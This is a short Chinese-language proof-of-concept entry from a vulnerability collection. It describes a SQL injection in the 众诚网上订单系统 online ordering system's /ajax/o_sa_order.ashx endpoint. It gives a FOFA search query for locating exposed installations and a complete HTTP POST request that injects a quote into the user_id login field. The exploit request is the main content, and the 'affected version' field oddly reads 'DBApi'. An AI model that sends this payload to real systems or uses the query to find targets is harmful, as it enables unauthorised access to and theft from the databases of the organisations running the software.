---
fofa: "title="
source: "wy876 漏洞文库"
---

# 众诚网上订单系统o_sa_order存在SQL注入漏洞

# 一、漏洞简介
众诚网上订单系统o_sa_order存在SQL注入漏洞，攻击者可获取数据库敏感信息。

# 二、影响版本
+ DBApi

# 三、资产测绘
+ fofa`title="欢迎使用众诚网上订单系统"`
+ 特征


# 四、漏洞复现
```plain
POST /ajax/o_sa_order.ashx HTTP/1.1
Host: 
Content-Length: 42
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: keep-alive
 
type=login&user_id=admin'&user_pwd=1111111
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ey0ogvbchsz4zpil>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
